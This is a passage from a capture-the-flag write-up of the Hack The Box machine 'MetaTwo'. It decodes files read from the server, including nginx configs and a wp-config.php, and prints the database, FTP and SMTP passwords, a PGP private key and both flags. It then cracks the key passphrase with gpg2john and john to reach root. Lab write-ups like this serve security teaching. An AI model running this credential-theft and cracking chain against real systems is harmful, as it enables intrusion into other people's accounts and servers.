2ZXIgewojCQlsaXN0ZW4gICAgIGxvY2FsaG9zdDoxNDM7CiMJCXByb3RvY29sICAgaW1hcDsKIwkJcHJveHkgICAgICBvbjsKIwl9CiN9Cg==" | base64 -d
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {

        ##
        # Basic Settings
        ##

        sendfile on;
        tcp_nopush on;
        types_hash_max_size 2048;
        # server_tokens off;

        # server_names_hash_bucket_size 64;
        # server_name_in_redirect off;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        ##
        # SSL Settings
        ##

        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
        ssl_prefer_server_ciphers on;

        ##
        # Logging Settings
        ##

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        ##
        # Gzip Settings
        ##

        gzip on;

        # gzip_vary on;
        # gzip_proxied any;
        # gzip_comp_level 6;
        # gzip_buffers 16 8k;
        # gzip_http_version 1.1;
        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

        ##
        # Virtual Host Configs
        ##

        include /etc/nginx/conf.d/*.conf;
+        include /etc/nginx/sites-enabled/*;
}

#mail {
#       # See sample authentication script at:
#       # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
#
#       # auth_http localhost/auth.php;
#       # pop3_capabilities "TOP" "USER";
#       # imap_capabilities "IMAP4rev1" "UIDPLUS";
#
#       server {
#               listen     localhost:110;
#               protocol   pop3;
#               proxy      on;
#       }
#
#       server {
#               listen     localhost:143;
#               protocol   imap;
#               proxy      on;
#       }
#}
```

As you can see from the colored part, we have a path that seems to be cool, maybe toward that we can take the default file of nginx `/etc/nginx/sites-enabled/default`

```diff
┌──(kali㉿kali)-[~/…/Hack_the_box/Machines/Metatwo/CVE-2021-29447]
└─$ echo "c2VydmVyIHsKCglsaXN0ZW4gODA7CglsaXN0ZW4gWzo6XTo4MDsKCglyb290IC92YXIvd3d3L21ldGFwcmVzcy5odGIvYmxvZzsKCglpbmRleCBpbmRleC5waHAgaW5kZXguaHRtbDsKCiAgICAgICAgaWYgKCRodHRwX2hvc3QgIT0gIm1ldGFwcmVzcy5odGIiKSB7CiAgICAgICAgICAgICAgICByZXdyaXRlIF4gaHR0cDovL21ldGFwcmVzcy5odGIvOwogICAgICAgIH0KCglsb2NhdGlvbiAvIHsKCQl0cnlfZmlsZXMgJHVyaSAkdXJpLyAvaW5kZXgucGhwPyRhcmdzOwoJfQogICAgCglsb2NhdGlvbiB+IFwucGhwJCB7CgkJaW5jbHVkZSBzbmlwcGV0cy9mYXN0Y2dpLXBocC5jb25mOwoJCWZhc3RjZ2lfcGFzcyB1bml4Oi92YXIvcnVuL3BocC9waHA4LjAtZnBtLnNvY2s7Cgl9CgoJbG9jYXRpb24gfiogXC4oanN8Y3NzfHBuZ3xqcGd8anBlZ3xnaWZ8aWNvfHN2ZykkIHsKCQlleHBpcmVzIG1heDsKCQlsb2dfbm90X2ZvdW5kIG9mZjsKCX0KCn0K" | base64 -d
server {

        listen 80;
        listen [::]:80;

+        root /var/www/metapress.htb/blog;

        index index.php index.html;

        if ($http_host != "metapress.htb") {
                rewrite ^ http://metapress.htb/;
        }

        location / {
+                try_files $uri $uri/ /index.php?$args;
        }
    
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
        }

        location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
                expires max;
                log_not_found off;
        }

}
```

We had right, and we’ve even found the root folder of the site which is `/var/www/metapress.htb/blog` , so we can now try to get the `wp-config.php`.

NOTE: Above there is even a [vulnerability](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/) because the path of that file is not closed so we could exploit the `\r` character to get XSS.

```diff
┌──(kali㉿kali)-[~/…/Hack_the_box/Machines/Metatwo/CVE-2021-29447]
└─$ echo "PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==" | base64 -d
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
+ define( 'FTP_USER', 'metapress.htb' );
+ define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Now we’ve found the credentials for the ftp account and even the ones for the mysql server. Firstly i tried try to login into the ftp one.

```bash
┌──(kali㉿kali)-[~/…/Hack_the_box/Machines/Metatwo/CVE-2021-29447]
└─$ lftp -u metapress.htb,9NYS_ii@FyL_p5M2NvJ 10.10.11.186
```

With this command we can login into the the ftp. Here there is the entire folder of the blog where we can find some files like the `user.php` , and another interesting file like `send_email.php`

```php
┌──(kali㉿kali)-[~/…/Hack_the_box/Machines/Metatwo/ftp_files]
└─$ cat send_email.php                                                                                       130 ⨯
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;
/* Creds found */               
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
                       
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}
```

Cool! They seems to be the credentials for the ssh port, so let’s try them

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/548d6ba9-4e76-4ee0-a9c0-90471414bbbc"></img>

We finally got into the machine and now we can grab the user flag.

```
jnelson@meta2:~$ cat user.txt 
f8e09fd4a20ec66ba7cdc106815a5122
```

# Root.txt

We are in so now we gotta find a vector for privilege escalation, so as usual  i run linpeas, but nothing useful found while inside the user dircetory there is a hidden one where two emails are located with a pgp message both for user and root.

```bash
comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: '-----BEGIN PGP MESSAGE-----

  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2

  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km

  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED

  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf

  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg

  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw

  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr

  lpF0RatbxQGWBks5F3o=

  =uh1B

  -----END PGP MESSAGE-----

  '
```

And then we have even some keys 

```bash
jnelson@meta2:~/.passpie$ cat .keys 
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
fo6KI+w2uXLaw+bIT1XZurDN
=dqsF
-----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP PRIVATE KEY BLOCK-----

lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho
3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT
ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV
gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX
5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp
tQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb
a1UfdG+soO3jtQsBAKbYl2yF/+D81v+42827iqO6gqoxHbc/0epLqJ+Lbl8hC/sG
WIVdy+jynHb81B3FIHT832OVi2hTCT6vhfTILFklLMxvirM6AaEPFhxIuRboiEQw
8lQMVtA1l+Et9FXS1u91h5ZL5PoCfhqpjbFD/VcC5I2MhwL7n50ozVxkW2wGAPfh
cODmYrGiXf8dle3z9wg9ltx25XLsVjoR+VLm5Vji85konRVuZ7TKnL5oXVgdaTML
qIGqKLQfhHwTdvtYOTtcxW3tIdI16YhezeoUioBWY1QM5z84F92UVz6aRzSDbc/j
FJOmNTe7+ShRRAAPu2qQn1xXexGXY2BFqAuhzFpO/dSidv7/UH2+x33XIUX1bPXH
FqSg+11VAfq3bgyBC1bXlsOyS2J6xRp31q8wJzUSlidodtNZL6APqwrYNhfcBEuE
PnItMPJS2j0DG2V8IAgFnsOgelh9ILU/OfCA4pD4f8QsB3eeUbUt90gmUa8wG7uM
FKZv0I+r9CBwjTK3bg/rFOo+DJKkN3hAfkARgU77ptuTJEYsfmho84ZaR3KSpX4L
/244aRzuaTW75hrZCJ4RxWxh8vGw0+/kPVDyrDc0XNv6iLIMt6zJGddVfRsFmE3Y
q2wOX/RzICWMbdreuQPuF0CkcvvHMeZX99Z3pEzUeuPu42E6JUj9DTYO8QJRDFr+
F2mStGpiqEOOvVmjHxHAduJpIgpcF8z18AosOswa8ryKg3CS2xQGkK84UliwuPUh
S8wCQQxveke5/IjbgE6GQOlzhpMUwzih7+15hEJVFdNZnbEC9K/ATYC/kbJSrbQM
RfcJUrnjPpDFgF6sXQJuNuPdowc36zjE7oIiD69ixGR5UjhvVy6yFlESuFzrwyeu
TDl0UOR6wikHa7tF/pekX317ZcRbWGOVr3BXYiFPTuXYBiX4+VG1fM5j3DCIho20
oFbEfVwnsTP6xxG2sJw48Fd+mKSMtYLDH004SoiSeQ8kTxNJeLxMiU8yaNX8Mwn4
V9fOIdsfks7Bv8uJP/lnKcteZjqgBnXPN6ESGjG1cbVfDsmVacVYL6bD4zn6ZN/n
WP4HAwKQfLVcyzeqrf8h02o0Q7OLrTXfDw4sd/a56XWRGGeGJgkRXzAqPQGWrsDC
6/eahMAwMFbfkhyWXlifgtfdcQme2XSUCNWtF6RCEAbYm0nAtDNQYXNzcGllIChB
dXRvLWdlbmVyYXRlZCBieSBQYXNzcGllKSA8cGFzc3BpZUBsb2NhbD6IkAQTEQgA
OBYhBHxnhqdWG8hPUEhnHjh3dcNXRdIDBQJiuFfWAhsjBQsJCAcCBhUKCQgLAgQW
AgMBAh4BAheAAAoJEDh3dcNXRdIDRFQA/3V6S3ad2W9c1fq62+X7TcuCaKWkDk4e
qalFZ3bhSFVIAP4qI7yXjBXZU4+Rd+gZKp77UNFdqcCyhGl1GpAJyyERDZ0BXwRi
uFfWEAQAhBp/xWPRH6n+PLXwJf0OL8mXGC6bh2gUeRO2mpFkFK4zXE5SE0znwn9J
CBcYy2EePd5ueDYC9iN3H7BYlhAUaRvlU7732CY6Tbw1jbmGFLyIxS7jHJwd3dXT
+PyrTxF+odQ6aSEhT4JZrCk5Ef7/7aGMH4UcXuiWrgTPFiDovicAAwUD/i6Q+sq+
FZplPakkaWO7hBC8NdCWsBKIQcPqZoyoEY7m0mpuSn4Mm0wX1SgNrncUFEUR6pyV
jqRBTGfPPjwLlaw5zfV+r7q+P/jTD09usYYFglqJj/Oi47UVT13ThYKyxKL0nn8G
JiJHAWqExFeq8eD22pTIoueyrybCfRJxzlJV/gcDAsPttfCSRgia/1PrBxACO3+4
VxHfI4p2KFuza9hwok3jrRS7D9CM51fK/XJkMehVoVyvetNXwXUotoEYeqoDZVEB
J2h0nXerWPkNKRrrfYh4BBgRCAAgFiEEfGeGp1YbyE9QSGceOHd1w1dF0gMFAmK4
V9YCGwwACgkQOHd1w1dF0gOm5gD9GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+P
o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
```

Having this privatekeys we can try to decrypt them and get  the message encrypted into the email

Let’s first use gpg2john to get the hash from the private key

```
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Metatwo]
└─$ gpg2john private-key.asc > hash

File private-key.asc
                                                                                                                   
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Metatwo]
└─$ cat hash           
Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::private-key.asc
                                                                                                                   
```

And then decrypt the key again with john to get the passphrase

```diff
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Metatwo]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt            
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
+ blink182         (Passpie)     
1g 0:00:00:08 DONE (2022-12-07 12:34) 0.1186g/s 19.45p/s 19.45c/s 19.45C/s peanut..blink182
Use the "--show" option to display all of the cracked passwords reliably
```

With this the password of the second key we can get the value of the 2 message which is

```
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Metatwo]
└─$ gpg --import private-key.asc   
gpg: key 387775C35745D203: public key "Passpie (Auto-generated by Passpie) <passpie@local>" imported
gpg: key 387775C35745D203: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
                                                                                                                   
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Metatwo]
└─$ gpg --decrypt root_pgp_message.txt.gpg 
gpg: encrypted with 1024-bit ELG key, ID A23EC25F8B5D831A, created 2022-06-26
      "Passpie (Auto-generated by Passpie) <passpie@local>"
p7qfAZt4_A1xo_0x
```

Now we can try our credential

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/7d2e8524-84a4-43f6-b4d9-995cae560be2"></img>

We did it! now we are root, and we can grab the root flag.

```
root@meta2:/home/jnelson# cat ~/root.txt 
263bd93b8b6ed9f4479f267d14cc2612
```

That’s all folks!
<div align="center">
  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/2b3c1c94-1c16-48b5-8442-455435e355da"></img>
</div>
Ty for your attention 0xCY@
